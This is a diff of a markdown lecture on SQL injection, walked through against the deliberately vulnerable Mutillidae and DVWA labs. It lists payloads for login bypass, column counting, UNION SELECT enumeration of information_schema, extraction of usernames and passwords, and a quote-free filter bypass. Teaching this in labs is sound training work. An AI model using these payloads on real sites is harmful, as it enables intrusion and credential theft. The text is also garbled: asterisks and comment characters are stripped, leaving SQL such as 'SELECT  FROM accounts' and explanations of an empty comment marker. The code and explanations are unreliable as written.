@@ -1,56 +1,56 @@
 <img width="1440" height="710" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cb14e3c4-94a6-4e34-a4ec-859a32304f4f" /> Introduction to SQL Injection
 
-In this lecture and the next few lectures, we will learn about a very common web vulnerability called **SQL Injection (SQLi)**.
+In this lecture and the next few lectures, we will learn about a very common web vulnerability called SQL Injection (SQLi).
 
-Before learning how SQL Injection works or how to exploit it, we first need to understand what **SQL** and **databases** are.
+Before learning how SQL Injection works or how to exploit it, we first need to understand what SQL and databases are.
 
 ---
 
  What is a Database?
 
-Most modern websites use a **database** to store information.
+Most modern websites use a database to store information.
 Only very small or simple websites may not use one.
 
 Databases are used to store:
 
-* Usernames
-* Passwords
-* Blog posts
-* News articles
-* Images
-* Comments
-* Credit card details
-* And almost all website data
+ Usernames
+ Passwords
+ Blog posts
+ News articles
+ Images
+ Comments
+ Credit card details
+ And almost all website data
 
 The website communicates with the database to:
 
-* Read data
-* Insert new data
-* Update existing data
-* Delete data
+ Read data
+ Insert new data
+ Update existing data
+ Delete data
 
 ---
 
  What is SQL?
 
-SQL stands for **Structured Query Language**.
+SQL stands for Structured Query Language.
 
 It is the language used by web applications to communicate with databases.
 
 Using SQL, applications can:
 
-* Retrieve information
-* Add new records
-* Modify existing records
-* Delete records
+ Retrieve information
+ Add new records
+ Modify existing records
+ Delete records
 
 ---
 
  Understanding Databases in Practice
 
-In this example, we log into the database installed on the **Metasploitable 2** machine.
+In this example, we log into the database installed on the Metasploitable 2 machine.
 
-This is **not hacking**.
+This is not hacking.
 We are only exploring how databases work.
 
 We log into MySQL:
@@ -59,8 +59,8 @@ We log into MySQL:
 mysql -u root
 ```
 
-* `-u root` → login as root user
-* Metasploitable has no root password (intentionally vulnerable)
+ `-u root` → login as root user
+ Metasploitable has no root password (intentionally vulnerable)
 
 ---
 
@@ -74,18 +74,18 @@ show databases;
 
 Example databases:
 
-* `information_schema`
-* `mysql`
-* `dvwa`
-* `owasp10`
-* `metasploit`
+ `information_schema`
+ `mysql`
+ `dvwa`
+ `owasp10`
+ `metasploit`
 
-Each web application usually has its **own database**.
+Each web application usually has its own database.
 
 For example:
 
-* DVWA uses the `dvwa` database
-* OWASP WebGoat uses another database
+ DVWA uses the `dvwa` database
+ OWASP WebGoat uses another database
 
 
 ---
@@ -102,15 +102,15 @@ use owasp10;
 
  Viewing Tables
 
-Each database contains **tables**.
+Each database contains tables.
 
 Tables store related information.
 
 Example:
 
-* `accounts`
-* `blogs`
-* `credit_cards`
+ `accounts`
+ `blogs`
+ `credit_cards`
 
 To display tables:
 
@@ -126,19 +126,19 @@ show tables;
 To view all data from the `accounts` table:
 
 ```sql id="e9dnwy"
-select * from accounts;
+select  from accounts;
 ```
 
-* `select` → retrieve data
-* `*` → select everything
-* `from accounts` → from the accounts table
+ `select` → retrieve data
+ `` → select everything
+ `from accounts` → from the accounts table
 
 This may display:
 
-* Usernames
-* Passwords
-* User IDs
-* Admin status
+ Usernames
+ Passwords
+ User IDs
+ Admin status
 
 ---
 
@@ -168,9 +168,9 @@ Stores specific categories of data
 Fields inside a table
 Example:
 
-* username
-* password
-* email
+ username
+ password
+ email
 
  SQL Queries
 
@@ -184,11 +184,11 @@ Normally, only website administrators can access the database directly.
 
 In upcoming labs, we will learn how attackers exploit SQL Injection vulnerabilities to:
 
-* Access databases
-* Read sensitive data
-* Modify records
-* Delete information
-* Gain full database control
+ Access databases
+ Read sensitive data
+ Modify records
+ Delete information
+ Gain full database control
 
 
 Why SQL Injection is Dangerous
@@ -217,16 +217,16 @@ If the application behaves strangely or shows a database error, it may indicate 
 
  Testing in Mutillidae
 
-In **OWASP Mutillidae II**, first register a normal account.
+In OWASP Mutillidae II, first register a normal account.
 For example:
 
-* Username: `adil`
-* Password: `123456`
+ Username: `adil`
+ Password: `123456`
 
 Now try logging in again, but this time enter:
 
-* Username: `adil`
-* Password:
+ Username: `adil`
+ Password:
 
 ```sql id="kpy38v"
 '
@@ -243,7 +243,7 @@ Usually in real-world applications, detailed database errors are hidden, but for
 The query becomes something like:
 
 ```sql id="bbawzk"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='adil' 
 AND password=''';
 ```
@@ -259,7 +259,7 @@ Now suppose we want to log in as admin without knowing the password.
 The normal query looks like:
 
 ```sql id="q8pbt6"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='admin' 
 AND password='password';
 ```
@@ -273,7 +273,7 @@ We can manipulate the password field using:
 The query now becomes:
 
 ```sql id="73p7gi"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='admin' 
 AND password='12' OR 1=1;
 ```
@@ -296,7 +296,7 @@ admin'
 The query becomes:
 
 ```sql id="aq2sh2"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='admin'' 
 AND password='';
 ```
@@ -312,9 +312,9 @@ Everything after `` becomes a comment, so the password check is ignored complete
 
 Now increase the security level from `0` to `1`.
 
-When trying the same payload directly in the browser, the request gets blocked and nothing appears in **Burp Suite**.
+When trying the same payload directly in the browser, the request gets blocked and nothing appears in Burp Suite.
 
-This happens because the filtering is occurring on the **client side**.
+This happens because the filtering is occurring on the client side.
 
 ---
 
@@ -330,8 +330,8 @@ Example payload:
 
 The browser detects dangerous characters like:
 
-* `'`
-* ``
+ `'`
+ ``
 
 and blocks the request immediately.
 
@@ -363,8 +363,8 @@ If we enter a normal username and password, the request successfully appears ins
 
 Example:
 
-* Username: `admin`
-* Password: `aaa`
+ Username: `admin`
+ Password: `aaa`
 
 <img width="1440" height="675" alt="Screenshot 2026-05-09 at 8 17 49 AM" src="https://github.com/user-attachments/assets/9565d3f7-2bc3-4b87-a2b5-dd223a6cbfb8" />
 
@@ -415,7 +415,7 @@ Bad username or password
 At low and medium levels, the application used queries like:
 
 ```php id="u0a9w1"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='$username' 
 AND password='$password';
 ```
@@ -434,9 +434,9 @@ mysqli_real_escape_string()
 
 This function escapes or removes dangerous characters such as:
 
-* `'`
-* `"`
-* special characters
+ `'`
+ `"`
+ special characters
 
 So a payload like:
 
@@ -454,16 +454,16 @@ WHERE username='$username'
 
 Because of this:
 
-* Everything inside the quotes becomes a string
-* Injected SQL code is not executed
+ Everything inside the quotes becomes a string
+ Injected SQL code is not executed
 
 ---
 
  Key Takeaway
 
-* Low security → vulnerable to direct SQL Injection
-* Medium security → uses weak client-side filtering
-* High security → escapes dangerous characters and blocks injection attempts
+ Low security → vulnerable to direct SQL Injection
+ Medium security → uses weak client-side filtering
+ High security → escapes dangerous characters and blocks injection attempts
 
 This is why proper input handling and secure coding are important in web applications.
 
@@ -473,7 +473,7 @@ This is why proper input handling and secure coding are important in web applica
 
 In this example, we are testing for an SQL Injection vulnerability on a page that displays user information.
 
-Previously, the injection was performed through a login form using the **POST** method. This time, the application passes user input directly through the URL using the **GET** method.
+Previously, the injection was performed through a login form using the POST method. This time, the application passes user input directly through the URL using the GET method.
 
 Example:
 
@@ -512,7 +512,7 @@ you should always test them because the application may be using those values di
 The backend query in this case is similar to:
 
 ```sql id="jlwm4d"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='adil' 
 AND password='123456';
 ```
@@ -531,14 +531,14 @@ adil' ORDER BY 1
 
 What happens here:
 
-* `'` closes the original username string
-* `ORDER BY 1` sorts results using the first column
-* `` comments out the rest of the query
+ `'` closes the original username string
+ `ORDER BY 1` sorts results using the first column
+ `` comments out the rest of the query
 
 The final SQL query becomes:
 
 ```sql id="jlwm6f"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='adil' ORDER BY 1'
 AND password='123456';
 ```
@@ -567,9 +567,9 @@ Unknown column '100000'
 
 This confirms that:
 
-* Our SQL code is being executed
-* The query is being modified successfully
-* The application is vulnerable to SQL Injection
+ Our SQL code is being executed
+ The query is being modified successfully
+ The application is vulnerable to SQL Injection
 
 <img width="1438" height="880" alt="Screenshot 2026-05-12 at 7 48 41 AM" src="https://github.com/user-attachments/assets/75059b04-c102-4119-b6dd-d975b91781ac" />
 
@@ -612,7 +612,7 @@ ORDER BY 6
 
 ❌ Returns an error
 
-This tells us the query is selecting exactly **5 columns**.
+This tells us the query is selecting exactly 5 columns.
 Anything higher than 5 causes an error because that column does not exist.
 
 ---
@@ -624,7 +624,7 @@ Now that we know the number of columns, we can create our own query using `UNION
 The original query looks something like:
 
 ```sql id="jlwm5t"
-SELECT * FROM accounts 
+SELECT  FROM accounts 
 WHERE username='adil';
 ```
 
@@ -636,9 +636,9 @@ We inject:
 
 Here:
 
-* `UNION SELECT` combines our results with the original query
-* We provide 5 values because the original query has 5 columns
-* `` comments out the remaining part of the SQL query
+ `UNION SELECT` combines our results with the original query
+ We provide 5 values because the original query has 5 columns
+ `` comments out the remaining part of the SQL query
 
 <img width="1440" height="863" alt="Screenshot 2026-05-12 at 7 58 50 AM" src="https://github.com/user-attachments/assets/04377012-ca6f-4253-9ea9-807d59dae6f8" />
 
@@ -650,9 +650,9 @@ This helps identify which columns are visible on the webpage.
 
 Example:
 
-* Column `2` appears in the **First Name** field
-* Column `3` appears in the **Surname** field
-* Column `4` appears in the **Signature** field
+ Column `2` appears in the First Name field
+ Column `3` appears in the Surname field
+ Column `4` appears in the Signature field
 
 ---
 
@@ -666,15 +666,15 @@ Instead of displaying numbers, we can use useful SQL functions:
 
 This retrieves:
 
-* `database()` → current database name
-* `user()` → current database user
-* `version()` → MySQL version
+ `database()` → current database name
+ `user()` → current database user
+ `version()` → MySQL version
 
 The results showed:
 
-* Current database: `owasp10`
-* Current user: `root@localhost`
-* MySQL version: `5.0.51`
+ Current database: `owasp10`
+ Current user: `root@localhost`
+ MySQL version: `5.0.51`
 
 <img width="1440" height="876" alt="Mutillidae Born to be Hacked" src="https://github.com/user-attachments/assets/cbeddab5-1799-4c25-b808-7afad0bdb064" />
 
@@ -685,9 +685,9 @@ The results showed:
 
 This tells us:
 
-* The application is connected to the `owasp10` database
-* The website is using the MySQL `root` account
-* We can now start extracting tables, columns, and sensitive data from the database
+ The application is connected to the `owasp10` database
+ The website is using the MySQL `root` account
+ We can now start extracting tables, columns, and sensitive data from the database
 
 In real-world applications, websites usually use limited database accounts instead of the root user. This helps restrict access only to the website’s own database and improves security.
 
@@ -700,9 +700,9 @@ To do this, we use `UNION SELECT` again, but this time we query MySQL’s intern
 
 `information_schema` is a default MySQL database that stores metadata about:
 
-* databases
-* tables
-* columns
+ databases
+ tables
+ columns
 
 The injection used is:
 
@@ -713,10 +713,10 @@ FROM information_schema.tables %23
 
 Here:
 
-* `table_name` retrieves the table names
-* `information_schema.tables` contains information about all tables
-* `NULL` is used for unused columns because the original query has 5 columns
-* `%23` is the URL-encoded version of `` used for comments
+ `table_name` retrieves the table names
+ `information_schema.tables` contains information about all tables
+ `NULL` is used for unused columns because the original query has 5 columns
+ `%23` is the URL-encoded version of `` used for comments
 
 <img width="1440" height="900" alt="Screenshot 2026-05-12 at 8 08 27 AM" src="https://github.com/user-attachments/assets/2bdfa630-c0e9-4aeb-a4d0-c52e54ebefa1" />
 
@@ -742,11 +742,11 @@ WHERE table_schema='owasp10'%23
 
 Now the results only show tables belonging to the `owasp10` database, such as:
 
-* `accounts`
-* `blogs_table`
-* `credit_cards`
-* `hitlog`
-* `pentest_tools`
+ `accounts`
+ `blogs_table`
+ `credit_cards`
+ `hitlog`
+ `pentest_tools`
 
 <img width="1440" height="836" alt="Screenshot 2026-05-12 at 8 20 57 AM" src="https://github.com/user-attachments/assets/fa0043ed-7e91-490b-bf4a-78924d6faae3" />
 
@@ -758,10 +758,10 @@ At this point, we successfully enumerated the database structure and discovered 
 
 These tables can later be targeted to extract sensitive information such as:
 
-* usernames
-* passwords
-* credit card data
-* application information
+ usernames
+ passwords
+ credit card data
+ application information
 
 {{  Discovering Column Names with SQL Injection }}
 
@@ -787,17 +787,17 @@ WHERE table_name='accounts'
 
 Here:
 
-* `column_name` retrieves the names of columns
-* `information_schema.columns` stores information about all columns
-* `WHERE table_name='accounts'` filters results to only the `accounts` table
+ `column_name` retrieves the names of columns
+ `information_schema.columns` stores information about all columns
+ `WHERE table_name='accounts'` filters results to only the `accounts` table
 
 When executed, the page returns column names such as:
 
-* `id`
-* `username`
-* `password`
-* `mysignature`
-* `isadmin`
+ `id`
+ `username`
+ `password`
+ `mysignature`
+ `isadmin`
 
 <img width="1440" height="871" alt="Screenshot 2026-05-12 at 9 28 01 AM" src="https://github.com/user-attachments/assets/03cc9c83-7eae-4bd9-8e46-0a2d4cbbfb15" />
 
@@ -817,9 +817,9 @@ FROM accounts
 
 This query retrieves:
 
-* usernames
-* passwords
-* admin status
+ usernames
+ passwords
+ admin status
 
 The values are placed in columns `2`, `3`, and `4` because earlier testing showed those columns are visible on the webpage.
 
@@ -827,9 +827,9 @@ When executed, the page displays all usernames and passwords stored in the datab
 
 Example results:
 
-* `admin : adminpass`
-* other usernames and passwords
-* whether the account has admin privileges
+ `admin : adminpass`
+ other usernames and passwords
+ whether the account has admin privileges
 
 <img width="1438" height="864" alt="Screenshot 2026-05-12 at 9 30 07 AM" src="https://github.com/user-attachments/assets/636379df-52af-48ba-9bd9-6e7ec0b2202c" />
 
@@ -859,7 +859,7 @@ The general process followed during SQL Injection testing is:
 
 {{  Blind SQL Injection  }}
 
-A Blind SQL Injection is a type of SQL Injection vulnerability where the website does **not** display database errors directly.
+A Blind SQL Injection is a type of SQL Injection vulnerability where the website does not display database errors directly.
 
 In a normal SQL Injection, entering something like:
 
@@ -871,14 +871,14 @@ may immediately produce an SQL error on the page, confirming the vulnerability.
 
 But in a Blind SQL Injection:
 
-* no SQL errors are displayed
-* the page may still be vulnerable
-* we detect it by observing how the page behaves
+ no SQL errors are displayed
+ the page may still be vulnerable
+ we detect it by observing how the page behaves
 
 Instead of relying on errors, we inject:
 
-* a **true** condition
-* and a **false** condition
+ a true condition
+ and a false condition
 
 Then we compare the responses.
 
@@ -993,4 +993,259 @@ FROM information_schema.tables
  Key Takeaway
 
 Experienced penetration testers usually test applications as if they are blind from the beginning instead of relying only on visible SQL errors. Even if no database error appears, differences in page behavior can still reveal SQL Injection vulnerabilities.
+
+
+
+{{ Discovering complex SQL Injection in DVWA }}
+
+Now that we already learned how to extract data using SQL Injection in OWASP Mutillidae II, we will try the same technique in DVWA (Damn Vulnerable Web Application).
+
+---
+
+ Low Security Level
+
+Go to:
+
+ DVWA → SQL Injection
+ Set Security Level → Low
+
+Enter:
+
+```sql
+1
+```
+
+The page displays valid user information such as first name and surname.
+
+<img width="1437" height="632" alt="Screenshot 2026-05-19 at 10 35 57 AM" src="https://github.com/user-attachments/assets/76da0cba-b48f-44bc-88c7-e60572c59d02" />
+
+
+---
+
+ Testing for SQL Injection
+
+Now add a single quote:
+
+```sql
+1'
+```
+
+This produces an SQL error, confirming that the page is vulnerable to SQL Injection.
+
+We can test further using a true condition:
+
+```sql
+1' AND 1=1
+```
+
+Since `1=1` is true, the page still works normally.
+
+Now test a false condition:
+
+```sql
+1' AND 1=0
+```
+
+Since `1=0` is false, the page becomes blank or invalid.
+
+This confirms that the SQL query is injectable.
+
+<img width="1440" height="508" alt="Screenshot 2026-05-19 at 10 36 34 AM" src="https://github.com/user-attachments/assets/b4a90f59-daa3-428c-a458-ba7ede063c23" />
+
+
+---
+
+ Finding the Number of Columns
+
+Next, use `ORDER BY` to determine the number of columns used in the query.
+
+Test:
+
+```sql
+1' ORDER BY 3
+```
+
+This returns an error.
+
+Now test:
+
+```sql
+1' ORDER BY 2
+```
+
+This works successfully.
+
+That means the query contains exactly 2 columns.
+
+<img width="1440" height="667" alt="Screenshot 2026-05-19 at 10 36 50 AM" src="https://github.com/user-attachments/assets/c7160ddf-ab36-418b-8c4f-cc2f8742549c" />
+
+
+---
+
+ Using UNION SELECT
+
+Now we can build a UNION SELECT query:
+
+```sql
+1' UNION SELECT 1,2
+```
+
+The page displays values from both columns, confirming successful injection.
+
+Next, retrieve the current database name:
+
+```sql
+1' UNION SELECT database(),2
+```
+
+Result:
+
+```sql
+dvwa
+```
+
+<img width="1440" height="550" alt="Screenshot 2026-05-19 at 10 37 46 AM" src="https://github.com/user-attachments/assets/0e9baa7c-5996-42ab-94b8-487894dde7c1" />
+
+
+---
+
+ Enumerating Tables
+
+Now retrieve table names from `information_schema.tables`:
+
+```sql
+1' UNION SELECT table_name,2
+FROM information_schema.tables
+WHERE table_schema='dvwa'
+```
+
+This returns tables such as:
+
+ guestbook
+ users
+
+<img width="1440" height="690" alt="Screenshot 2026-05-19 at 10 39 06 AM" src="https://github.com/user-attachments/assets/7d06034e-042d-4804-b7dd-03c5f4946d0b" />
+
+
+---
+
+ Extracting Column Names
+
+Now we need to identify the column names inside the `users` table.
+
+```sql
+1' UNION SELECT column_name,2
+FROM information_schema.columns
+WHERE table_name='users'
+```
+
+This displays columns such as:
+
+ user
+ password
+ first_name
+ last_name
+
+<img width="1437" height="722" alt="Screenshot 2026-05-19 at 10 39 47 AM" src="https://github.com/user-attachments/assets/ff4f27ba-5d1a-4669-93a3-4d4d0bba0ad5" />
+
+
+---
+
+ Extracting Usernames and Passwords
+
+Now retrieve usernames and password hashes:
+
+```sql
+1' UNION SELECT user,password
+FROM users
+```
+
+The page displays usernames and password hashes stored in the database.
+
+<img width="1440" height="695" alt="Screenshot 2026-05-19 at 10 40 15 AM" src="https://github.com/user-attachments/assets/c6df8309-c2ce-4548-92d6-6c509929addd" />
+
+---
+
+ SQL Injection – Medium Security
+
+Now change DVWA Security Level to:
+
+```text
+Medium
+```
+
+At first, the previous payloads appear to fail.
+
+Example:
+
+```sql
+1' AND 1=1
+```
+
+Instead of working, the page shows an error related to the quote character.
+
+<img width="1440" height="398" alt="Screenshot 2026-05-19 at 10 44 34 AM" src="https://github.com/user-attachments/assets/f11f64fe-9123-4c30-b808-459254d2086a" />
+
+
+Even URL-encoding the quote:
+
+```text
+%27
+```
+
+still fails.
+
+---
+
+ Bypassing Medium Security
+
+After testing different payloads, we discover that the application becomes injectable without using quotes.
+
+This payload works:
+
+```sql
+1 AND 1=1
+```
+
+This payload fails:
+
+```sql
+1 AND 1=0
+```
+
+This confirms the page is still vulnerable to SQL Injection.
+
+<img width="1440" height="658" alt="Screenshot 2026-05-19 at 10 45 14 AM" src="https://github.com/user-attachments/assets/a60e3c95-9cca-438e-a129-7df355bcda1e" />
+
+
+---
+
+ UNION SELECT Without Quotes
+
+Now continue exploitation normally.
+
+Test:
+
+```sql
+1 UNION SELECT 1,2
+```
+
+Then retrieve table names:
+
+```sql
+1 UNION SELECT table_name,2
+FROM information_schema.tables
+```
+
+The application successfully returns database tables again.
+
+
+
+ Key Takeaway
+
+ Low security allows direct SQL Injection
+ Medium security blocks quotes but is still vulnerable
+ Attackers can bypass weak filtering using alternative payloads
+ `UNION SELECT` allows attackers to extract sensitive database information
+ Always use parameterized queries / prepared statements to prevent SQL Injection
 
